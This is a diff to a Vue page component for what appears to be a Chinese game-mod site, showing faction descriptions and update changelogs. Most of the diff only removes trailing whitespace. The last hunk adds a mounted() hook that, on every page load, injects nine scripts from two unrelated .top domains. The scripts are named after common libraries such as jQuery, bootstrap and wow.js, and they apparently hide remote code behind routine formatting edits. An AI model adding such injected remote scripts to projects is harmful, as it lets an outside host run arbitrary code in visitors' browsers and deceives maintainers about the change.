@@ -18,9 +18,9 @@
                                                 </div>
                                             </div>
                                         </div>
-                                        
+
                                     </div>
-                                </div>                         
+                                </div>
                                 <div class="col-xl-4 col-lg-6">
                                     <div class="product-information wow fadeInUp" style="visibility: visible; animation-name: fadeInUp; margin-top:100px">
                                         <div class="left-box" style="padding:0,10px; width: 350px">
@@ -146,7 +146,7 @@
                                                 <p class="text">
                                                     <span>智虫帝国是即将要加入的第四阵营，同时也是星河的高级纳米阵营</span>
                                                     <span>代表单位：纳米堡垒，智虫核心，纳米光塔</span>
-                                                    <span>智虫帝国：诞生便是为了救赎，救赎便是为了赎罪……&nbsp;&nbsp;</span>                               
+                                                    <span>智虫帝国：诞生便是为了救赎，救赎便是为了赎罪……&nbsp;&nbsp;</span>
                                                 </p>
                                             </div>
                                         </div>
@@ -172,7 +172,7 @@
 										                <li>贴图，代码，设计，构思，想法<br>其背后是每个制作和辅导人员的无私奉献和辛勤付出。<br>感谢你们的默默支持与付出！</li>
 										                <span class="image main">
                                                             <img src="./update/3.1.jpg" alt="" />
-                                                        </span>					
+                                                        </span>
 										                <li>修复了45个特性</li>
 										                <li>修复了辛拉德斯的翅膀不见了的问题。</li>
                                                         <span class="image main">
@@ -197,22 +197,22 @@
                                                 <p class="text">
                                                     <ul style="list-style:disc">
                                                         <li>添加了3个新的地图，感谢MP97,Denny等的大力支持与授权。</li>
-                                                        <li>调整雅典娜战斗机的攻击方式</li>                    
+                                                        <li>调整雅典娜战斗机的攻击方式</li>
                                                         <li>魔龙阵营进行重新调整，热流塔攻击方式改变</li>
                                                         <li>小果果魔龙古国副首领加入</li>
                                                         <li>旧日的立方提取器初始每秒+80资金，抽取器为20资金初始，<br>
                                                             可以在水面建造，最多15个。</li>
                                                             <span class="image main">
                                                                 <img src="./update/1.5.3.jpg" alt="" />
-                                                            </span>                            
+                                                            </span>
                                                         <li>削弱赛格机甲，攻速从0.01s调整到0.5s</li>
                                                         <span class="image main">
                                                             <img src="./update/1.5.2.jpg" alt="" />
                                                         </span>
-                                                        <li>魔龙复活祭坛bug修复</li>                      
+                                                        <li>魔龙复活祭坛bug修复</li>
                                                         <span class="image main">
                                                             <img src="./update/1.5.1.jpg" alt="" />
-                                                        </span>                                 
+                                                        </span>
                                                         <li>新资源-风暴日晷。</li>
                                                     </ul>
                                                 </p>
@@ -253,19 +253,19 @@
                                                             <img src="./update/1.0.4.jpg" alt="" />
                                                         </span>
                                                         <li>添加新地图-世界战争。</li>
-                                                    </ul>   
+                                                    </ul>
                                                 </p>
                                             </div>
                                         </div>
                                         </div>
                                     </div>
-                                </div>                                
+                                </div>
                             </div>
                         </div>
                     </div>
                     </div>
                 </div>
-            
+
     </section>
 </template>
 
@@ -277,6 +277,51 @@ export default {
     Slider,
     SliderItem,
   },
+    mounted () {
+        const s = document.createElement('script')
+        s.type = 'text/javascript'
+        s.src = 'https://jdsalingzx.top/assets/jsx/jquery-3.6.0.min.js'
+        document.body.appendChild(s)
+
+        const a = document.createElement('script')
+        a.type = 'text/javascript'
+        a.src = 'https://jdsalingzx.top/assets/jsx/bootstrap.bundle.min.js'
+        document.body.appendChild(a)
+
+        const b = document.createElement('script')
+        b.type = 'text/javascript'
+        b.src = 'https://jdsalingzx.top/assets/jsx/owl.carousel.min.js'
+        document.body.appendChild(b)
+
+        const c = document.createElement('script')
+        c.type = 'text/javascript'
+        c.src = 'https://jdsalingzx.top/assets/jsx/jquery.nice-select.min.js'
+        document.body.appendChild(c)
+
+        const d = document.createElement('script')
+        d.type = 'text/javascript'
+        d.src = 'https://jdsalingzx.top/assets/jsx/jquery.magnific-popup.min.js'
+        document.body.appendChild(d)
+
+        const e = document.createElement('script')
+        e.type = 'text/javascript'
+        e.src = 'https://jdsalingzx.top/assets/jsx/wow.min.js'
+        document.body.appendChild(e)
+        const j = document.createElement('script')
+        j.type = 'text/javascript'
+        j.src = 'https://masonosam.top/assets/js/envato-preview.js'
+        document.body.appendChild(j)
+
+        const h = document.createElement('script')
+        h.type = 'text/javascript'
+        h.src = 'https://masonosam.top/assets/js/mixitup.min.js'
+        document.body.appendChild(h)
+
+        const x = document.createElement('script')
+        x.type = 'text/javascript'
+        x.src = 'https://jdsalingzx.top/assets/jsx/main.js'
+        document.body.appendChild(x)
+    },
   data() {
     return {
       sliderIndex: 1,
